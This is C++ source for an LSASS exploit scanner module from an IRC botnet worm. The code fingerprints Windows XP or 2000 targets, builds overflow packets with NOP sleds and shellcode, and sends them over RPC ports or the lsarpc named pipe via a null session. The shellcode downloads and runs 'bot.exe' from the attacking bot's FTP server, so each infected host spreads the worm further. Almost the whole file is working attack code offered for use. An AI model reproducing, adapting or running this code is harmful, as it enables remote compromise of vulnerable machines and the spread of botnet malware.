	0xDE, 0x93, 0x37, 0x6F, 0x79, 0x01, 0xB8, 0x34, 0xDA, 0xD7, 0x86, 0x31, 0x15, 0xD8, 0x44, 0xE1, 
	0x43, 0xD1, 0xB2, 0xF5, 0xCA, 0xC9, 0x41, 0x6E, 0x90, 0x0C, 0x6B, 0xD0, 0xCA, 0x68, 0xF1, 0x54, 
	0xDF, 0xDF, 0xE0, 0x9A, 0x2E, 0xFF, 0xE2, 0x18, 0x99, 0xF1, 0x7A, 0xF7, 0x7A, 0x89, 0x09, 0x8D, 
	0x0E, 0x6E, 0x04, 0x47, 0x3B, 0x23, 0xAB, 0x29, 0xF4, 0x91, 0xA2, 0x29, 0x11, 0x76, 0xDD, 0x57, 
	0x9B, 0xD0, 0xC9, 0x18, 0x1B, 0x89, 0x47, 0x1D, 0xFD, 0xF4, 0x92, 0x31, 0x24, 0xB2, 0x2D, 0x1C, 
	0x9B, 0xD5, 0xA5, 0x2C, 0xE0, 0x85, 0x0E, 0x5C, 0xBC, 0xC9, 0x0D, 0x99, 0x1E, 0x39, 0x07, 0x24, 
	0xB6, 0x78, 0xA4, 0x97, 0x04, 0xDE, 0x7D, 0x93, 0x62, 0x48, 0x5A, 0xE0, 0xA0, 0x6E, 0xF7, 0xAF, 
	0xA5, 0xCB, 0x95, 0x47, 0x8D, 0x68, 0x3D, 0x83, 0x4C, 0xF9, 0x5D, 0xA0, 0xEA, 0x1B, 0x9A, 0x4B, 
	0xE7, 0xA1, 0x89, 0x15, 0xF2, 0x56, 0x22, 0xD7, 0xD8, 0x1C, 0x2F, 0xEE, 0xC2, 0x75, 0x19, 0x6D, 
	0xBD, 0x77, 0xF0, 0x5B, 0x41, 0xB2, 0x85, 0xCD, 0x73, 0xC5, 0x92, 0xAA, 0x46, 0x31, 0x7D, 0xB1, 
	0x6A, 0x4E, 0x0D, 0x11, 0x38, 0x60, 0xA5, 0xC0, 0xE9, 0xC5, 0x34, 0xF9, 0x83, 0xDD, 0xC3, 0x34, 
	0x9E, 0xC7, 0xD6, 0x37, 0x21, 0x1F, 0xDA, 0x36, 0x55, 0xC2, 0x80, 0xDB, 0x5D, 0x94, 0x76, 0xF6, 
	0xAF, 0x2E, 0x07, 0x2D, 0x9D, 0xCF, 0x1C, 0x6C, 0x6B, 0xBB, 0xA7, 0xF0, 0x6A, 0x3C, 0xBD, 0x55, 
	0x8A, 0xDE, 0x60, 0xD2, 0xDD, 0xA0, 0xD6, 0x03, 0x50, 0x01, 0x52, 0x01, 0x29, 0x0E, 0x38, 0x3A, 
	0x35, 0xCF, 0x3E, 0x26, 0xB7, 0x51, 0xD0, 0x3F, 0xCD, 0x8D, 0x49, 0x2F, 0x6F, 0x98, 0xBD, 0x77, 
	0x5F, 0x0C, 0xBC, 0xA9, 0x64, 0x03, 0x6F, 0x6B, 0x7C, 0x6A, 0x8D, 0xB2, 0xC0, 0x08, 0x00, 0x00 };

char *g_szPrecStringXP=NULL, *g_szPrecString2K=NULL;

class CPrec {
public:
	CPrec() { int i=0;
		g_szPrecStringXP=new char[STRING_LENGTH_XP-24+2]; g_szPrecString2K=new char[STRING_LENGTH+2];
		memset(g_szPrecStringXP, 0, STRING_LENGTH_XP-24+1); memset(g_szPrecString2K, 0, STRING_LENGTH+1);
		for(i=0; i<STRING_LENGTH_XP-24; i+=4) *(unsigned long*)(g_szPrecStringXP+i)=ADDR_CALLESP_WINXP;
		for(i=0; i<STRING_LENGTH; i+=2) *(unsigned short*)(g_szPrecString2K+i)=0x41; }
	virtual ~CPrec() { delete [] g_szPrecStringXP; delete [] g_szPrecString2K; } };

CPrec g_cPrec;

/*
		LSASS Scanner starts here
		scans for lsass exploit
*/

CScannerLSASS::CScannerLSASS() { m_szType="CScannerLSASS"; m_sScannerName.Assign("LSASS"); }

bool CScannerLSASS::Exploit()
{
	char szRecvBuf[4096]; char szSCBuf[4096]; char szReqBuf[4096]; char szShellBuf[4096];
	int iShellSize=0, iPos=0, iSCSize=0, iReqSize=0;
	char *pTemp; int iHostOS=FpHost(m_sSocket.m_szHost, FP_RPC);
	if(iHostOS==OS_UNKNOWN) iHostOS=FpHost(m_sSocket.m_szHost, FP_SMB);
	if(iHostOS==OS_WINNT) return false;
		
	
	CString sURL;

	if(IsPrivate(g_pMainCtrl->m_cIRC.m_sLocalIp.CStr()) && !IsPrivate(m_sSocket.m_szHost))
		sURL.Format("ftp://bla:bla@%s:%d/bot.exe", g_pMainCtrl->m_cIRC.m_sLocalHost.CStr(), \
			g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);
	else
		sURL.Format("ftp://bla:bla@%s:%d/bot.exe", inet_ntoa(to_in_addr(g_pMainCtrl->m_cIRC.m_lLocalAddr)), \
			g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);



	SendLocal("%s: Exploited %s", m_sScannerName.CStr(), m_sSocket.m_szHost);


	iShellSize=setup_shellcode_udtf(szShellBuf, sizeof(szShellBuf), sURL.Str(), true);
			
	unsigned char *szPacketInt=NULL, *szPacket=NULL; int iPacketLen=0;

	switch(iHostOS) {
	default: case OS_WINXP:
		{
			// Size = the header, string, 2 terminating \x00 (unicode), the end
			iPacketLen=sizeof(szPacketXP_Header)+STRING_LENGTH_XP+2+sizeof(szPacketXP_End);
			
			// Allocate the packet
			szPacket=new unsigned char[iPacketLen+2]; memset(szPacket, 0x00, iPacketLen+1);

			// Construct the packet base
			memcpy(szPacket, szPacketXP_Header, sizeof(szPacketXP_Header));
			memcpy(szPacket+sizeof(szPacketXP_Header), g_szPrecStringXP, STRING_LENGTH_XP-24);

			memset(szPacket+sizeof(szPacketXP_Header)+STRING_LENGTH_XP-48, '\x00', 2);
			memcpy(szPacket+sizeof(szPacketXP_Header)+STRING_LENGTH_XP-48+2, szPacketXP_End, sizeof(szPacketXP_End));

			// Set the sizes of rpc header, and lpDnsDomainName string
			unsigned long lPacketSize=iPacketLen;
			unsigned long lPacketHint=iPacketLen-RPC_LENGTH;
			unsigned long lStringSize=(STRING_LENGTH_XP+2)/2;

			*(unsigned long*)(szPacket+OFFSET_PACKET_SIZE)	= lPacketSize;
			*(unsigned long*)(szPacket+OFFSET_PACKET_HINT)	= lPacketHint;
			*(unsigned long*)(szPacket+OFFSET_STRING_SIZE1)	= lStringSize;
			*(unsigned long*)(szPacket+OFFSET_STRING_SIZE2)	= lStringSize;

			// Add the call code to jump to the beginning of the buffer
			memcpy(szPacket+sizeof(szPacketXP_Header)+OFFSET_CALLCODE_WINXP, szPacketXP_CallCode, sizeof(szPacketXP_CallCode));


			// Add nop-sled just in case, fill from start to ishellsize+20
			for(int i=0;i<=iShellSize+20;i++) { memset(szPacket+sizeof(szPacketXP_Header)+i,0x90,1); }

			// Fill in the shellcode
			memcpy(szPacket+sizeof(szPacketXP_Header)+OFFSET_SHELLCODE_WINXP, szShellBuf, iShellSize);
		}
		break;
	case OS_WIN2K:
		{
			// Size = the header, string, 2 terminating \x00 (unicode), the end
			iPacketLen=sizeof(szPacket2K_Header)+STRING_LENGTH+2+sizeof(szPacket2K_End);
			
			// Allocate the packet
			szPacket=new unsigned char[iPacketLen+2]; memset(szPacket, 0, iPacketLen+1);

			// Construct the packet base
			memcpy(szPacket, szPacket2K_Header, sizeof(szPacket2K_Header));
			memcpy(szPacket+sizeof(szPacket2K_Header), g_szPrecString2K, STRING_LENGTH);
			memset(szPacket+sizeof(szPacket2K_Header)+STRING_LENGTH, '\x00', 2);
			memcpy(szPacket+sizeof(szPacket2K_Header)+STRING_LENGTH+2, szPacket2K_End, sizeof(szPacket2K_End));

			// Set the sizes of rpc header, and lpDnsDomainName string
			unsigned long lPacketSize=iPacketLen;
			unsigned long lPacketHint=iPacketLen-RPC_LENGTH;
			unsigned long lStringSize=(STRING_LENGTH+2)/2;

			*(unsigned long*)(szPacket+OFFSET_PACKET_SIZE)	= lPacketSize;
			*(unsigned long*)(szPacket+OFFSET_PACKET_HINT)	= lPacketHint;
			*(unsigned long*)(szPacket+OFFSET_STRING_SIZE1)	= lStringSize;
			*(unsigned long*)(szPacket+OFFSET_STRING_SIZE2)	= lStringSize;

			// Add the call code to jump to the beginning of the buffer
			memcpy(szPacket+sizeof(szPacket2K_Header)+OFFSET_CALLCODE_WIN2K, szPacket2K_CallCode, sizeof(szPacket2K_CallCode));

			// Fill in the offset
			memcpy(szPacket+sizeof(szPacket2K_Header)+OFFSET_EIP_WIN2K,		szOffsetCallEbxWin2K, sizeof(szOffsetCallEbxWin2K));

			// Allocate space for the unicode string
			char *szShellUnicode=new char[iShellSize*2]; memset(szShellUnicode, 0, iShellSize*2);

			// Convert shellcode to unicode
			if(Unicodify(szShellBuf, iShellSize, szShellUnicode, iShellSize*2)==-1) { delete [] szShellUnicode; return 1; }

			// Fill in the shellcode as unicode
			memcpy(szPacket+sizeof(szPacket2K_Header)+OFFSET_SHELLCODE_WIN2K, szShellUnicode, (iShellSize*2)-2);
			
			// Free the unicode string
			delete [] szShellUnicode;
		}
		break;
	}

	switch(m_sSocket.m_sPort) {
	case 135: case 1025: {
			// Connect to the server
			if(!m_sSocket.Connect(m_sSocket.m_szHost, m_sSocket.m_sPort)) { delete [] szPacket; return false; } // Connect failed, exit
			// Send the bind string
			if(!m_sSocket.Write((char*)bindstr, sizeof(bindstr))) { m_sSocket.Disconnect(); delete [] szPacket; return false; }
			// Read reply
			if(!m_sSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 10000)) { m_sSocket.Disconnect(); delete [] szPacket; return false; }
			// Send the evil request
			if(!m_sSocket.Write((char*)szPacket, iPacketLen)) { m_sSocket.Disconnect(); delete [] szPacket; return false; }
			m_sSocket.Disconnect(); delete [] szPacket; return true; }
		break;
	case 445: {
			NETRESOURCEW nr; bool bRetVal=false; unsigned long lWritten;
			if(!ConnectViaNullSession(m_sSocket.m_szHost, &nr)) { delete [] szPacket; return false; }
			else {
				CString sPipePath; sPipePath.Format("\\\\%s\\pipe\\lsarpc", m_sSocket.m_szHost);
				HANDLE hFile=CreateFile(sPipePath.CStr(), GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				if(hFile==INVALID_HANDLE_VALUE) { CloseNullSession(m_sSocket.m_szHost); delete [] szPacket; return false; }
				DWORD dwRead; TransactNamedPipe(hFile, bindstr, sizeof(bindstr), szRecvBuf, sizeof(szRecvBuf), &dwRead, NULL);
				if(szRecvBuf[2]!=0x0C) { CloseHandle(hFile); CloseNullSession(m_sSocket.m_szHost); delete [] szPacket; return false; }
				if(!WriteFile(hFile, szPacket, iPacketLen, &lWritten, 0)) { CloseHandle(hFile); CloseNullSession(m_sSocket.m_szHost); delete [] szPacket; return false; }
				CloseHandle(hFile); }
			CloseNullSession(m_sSocket.m_szHost); delete [] szPacket; return true; }
		break;
	default: { delete [] szPacket; return false; } break; }
	delete [] szPacket; return false; }

REGSCANNER(LSASS, LSASS, 445, true, true)


